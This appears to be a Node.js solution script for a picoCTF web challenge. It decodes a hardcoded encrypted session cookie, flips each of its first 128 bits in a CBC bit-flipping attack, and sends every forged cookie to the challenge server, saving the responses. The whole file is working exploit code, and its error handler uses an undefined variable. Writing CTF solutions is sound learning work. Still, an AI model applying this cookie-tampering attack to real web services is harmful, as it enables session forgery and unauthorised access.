
import fs   from 'fs';
import http from 'http';



const decode_cookie = (buffer0) => {

	let buffer1 = Buffer.from(buffer0.toString('utf8'), 'base64');
	let buffer2 = Buffer.from(buffer1.toString('utf8'), 'base64');

	return buffer2;

};

const encode_cookie = (buffer0) => {

	let buffer1 = Buffer.from(buffer0, 'utf8').toString('base64');
	let buffer2 = Buffer.from(buffer1, 'utf8').toString('base64');

	return buffer2;

};

// CBC bit flip attack, in hope that they used synchronous AES
const flip_bit = (buffer, bit_position) => {

	let index  = Math.floor(bit_position / 8);
	let result = Buffer.from(buffer);
	let mask   = [ 0, 0, 0, 0, 0, 0, 0, 0 ];

	mask[bit_position % 8]  = 1;
	result[index]          ^= parseInt(mask.join(''), 2);

	return result;

};


const ENCRYPTED_COOKIE = Buffer.from('N1BOd1VJWEh0eldqZjFhM3NHQ2llaGJyN0JydW9pWUhRaC9iL05STHpxZVFTbkJrOWx4V0xnc2hzcXJCUXFZT0poWkR4TGYzSmJMZ0h6eTg1eXcvRUl6bEVDWEx6QmtNQkxpa2Z1M0ZYcC94dVQ2ejM3dWRxQVJnQXozZzlTWkY=', 'utf8');

const attack = (bit) => {

	let session = decode_cookie(ENCRYPTED_COOKIE);
	let fixed   = flip_bit(session, bit);
	let cookie  = encode_cookie(fixed).toString('utf8');

	let request = http.request('http://mercury.picoctf.net:21553', {
		headers: {
			'Cookie':  'name=0; auth_name=' + cookie,
			'Host':    'mercury.picoctf.net:21553',
			'Referer': 'http://mercury.picoctf.net:21553/'
		},
		method: 'GET'
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let payload = Buffer.concat(chunks);
			let headers = Buffer.from(JSON.stringify(response.headers, null, '\t'), 'utf8');

			fs.writeFileSync('cookies/' + bit + '.payload', payload);
			fs.writeFileSync('cookies/' + bit + '.headers', headers);

		});

	});

	request.on('error', (err) => {
		console.error('ERROR requesting cookie #' + num + '!');
	});

	request.end();

};


for (let b = 0; b < 128; b++) {
	attack(b);
}

